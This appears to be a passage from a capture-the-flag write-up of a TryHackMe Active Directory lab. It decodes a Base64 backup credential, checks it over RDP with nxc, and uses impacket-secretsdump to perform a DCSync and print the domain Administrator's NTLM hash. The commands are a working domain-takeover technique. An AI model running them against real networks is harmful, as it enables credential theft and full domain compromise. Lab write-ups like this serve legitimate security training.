Found some `backup_credentials`  in `C:\Shared\backup`

`YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`

This is a Base64 encoded string, decoding it gives us
`backup@spookysec.local:backup2517860`

```bash
nxc rdp 10.10.208.7 -u backup -p 'backup2517860' -d spookysec.local
```
![[Pasted image 20240812093002.png]]

We have access to the `backup` user in `THM-AD` that has permissions to sync all AD changes including password hashes. This can be exploited using `secretsdump`

```bash
impacket-secretsdump -just-dc-user administrator THM-AD/backup:"backup2517860"@10.10.208.7
```

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::`

